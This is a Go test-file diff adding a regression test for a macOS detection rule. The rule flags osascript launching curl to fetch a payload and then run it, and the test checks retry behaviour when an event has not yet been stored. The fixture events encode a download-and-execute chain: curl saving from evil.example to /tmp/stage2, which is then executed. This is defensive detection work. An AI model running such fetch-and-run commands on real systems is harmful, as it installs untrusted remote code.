@@ -3,6 +3,7 @@ package catalog
 import (
 	"encoding/json"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
@@ -291,4 +292,46 @@ func TestOsascriptNetworkExec_TempExecWithoutDownloadDoesNotFire(t *testing.T) {
 	findings, err := rule.Evaluate(ctx, events, s.GraphReader())
 	require.NoError(t, err)
 	assert.Empty(t, findings)
+}
+
+// spec:server-detection-rules-engine/osascript-waits-for-the-temp-exec-it-judges/a-young-temp-exec-is-retried-then-decided
+//
+// The named repro for issue #1170. The ancestor walk used to look the temp exec's pid up plainly and end on a miss, so a chain whose
+// temp exec had not materialized yet (a concurrent batch still committing its row) was dropped for good rather than retried. It must
+// now raise the retryable sentinel inside the grace, and fire once the row lands.
+func TestOsascriptNetworkExec_AYoungTempExecIsRetriedThenDecided(t *testing.T) {
+	t.Parallel()
+	s := openCatalogStore(t)
+	ctx := t.Context()
+
+	chain := []api.Event{
+		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
+			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
+		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
+			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
+		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
+			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
+		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
+			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil.example/x"],"uid":501,"gid":20}`)},
+	}
+	stage2 := []api.Event{
+		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
+			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
+		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 3100, IngestedAtNs: time.Now().UnixNano(), EventType: "exec",
+			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
+	}
+	require.NoError(t, s.InsertEvents(ctx, chain))
+	materialize(t, s, chain)
+	trigger := stage2[1]
+
+	rule := &OsascriptNetworkExec{}
+	_, err := rule.Evaluate(ctx, []api.Event{trigger}, s.GraphReader())
+	require.ErrorIs(t, err, api.ErrProcessNotYetMaterialized, "a young miss is a retry, not a silent drop")
+
+	require.NoError(t, s.InsertEvents(ctx, stage2))
+	materialize(t, s, stage2)
+	findings, err := rule.Evaluate(ctx, []api.Event{trigger}, s.GraphReader())
+	require.NoError(t, err)
+	require.Len(t, findings, 1, "the retried event is decided once its record lands")
+	assert.Contains(t, findings[0].Description, "/tmp/stage2")
 }
